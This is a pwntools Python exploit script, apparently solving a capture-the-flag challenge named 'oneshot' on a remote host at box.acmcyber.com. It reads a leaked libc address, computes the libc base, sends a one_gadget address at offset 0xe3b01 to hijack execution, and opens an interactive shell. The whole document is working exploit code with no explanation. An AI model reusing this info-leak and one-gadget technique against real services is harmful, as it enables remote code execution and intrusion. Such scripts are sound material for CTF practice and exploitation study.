#!/usr/bin/env python3

import os
os.chdir("./patched")

from pwn import *

exe = ELF("./oneshot_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("box.acmcyber.com", 31389)

    return r


def main():
    r = conn()

    # Obtain the libc base addr
    r.recvuntil(b'0x')
    libc.address = int(r.recvuntil(b',', drop=True), 16) - libc.sym._IO_2_1_stdin_
    log.info(f"{hex(libc.address)=}")

    # One-shot found using https://github.com/david942j/one_gadget.git
    one_shot = libc.address + 0xe3b01
    r.sendline(str(one_shot))

    r.interactive()


if __name__ == "__main__":
    main()
